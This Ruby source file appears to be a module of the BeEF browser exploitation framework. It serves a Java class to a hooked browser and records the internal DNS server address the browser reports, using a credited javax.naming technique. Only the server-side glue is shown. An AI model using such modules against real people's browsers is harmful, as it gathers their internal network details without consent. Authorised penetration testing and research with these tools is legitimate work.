#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
# Uses the Packages.javax.naming package with DNS of "dns://"
# Technique discovered by Stefano Di Paola from Minded Security Research Labs
# Advisory: http://blog.mindedsecurity.com/2010/10/get-internal-network-information-with.html

class Detect_dns_address < BeEF::Core::Command

  def pre_send
    # Mount the doNothing.class on /doNothing.class
    # Unsure if there's something we can add here to check if the module was already mounted?
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/network/detect_dns_address/doNothing.class','/doNothing','class')
  end
  
  def self.options
    return [
        {'name'=>'command_timeout', 'ui_label'=>'Timeout (s)', 'value'=>'30'}
    ]
  end
 
  def callback
    content = {}
    content['dns_address'] = @datastore['dns_address'] if not @datastore['dns_address'].nil?
    content['fail'] = @datastore['fail'] if not @datastore['fail'].nil? 
    content['fail'] = 'could not detect dns address' if content.empty?
    save content

    # Unmount the class now, it's no longer required.
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/doNothing.class');

  end
  
end
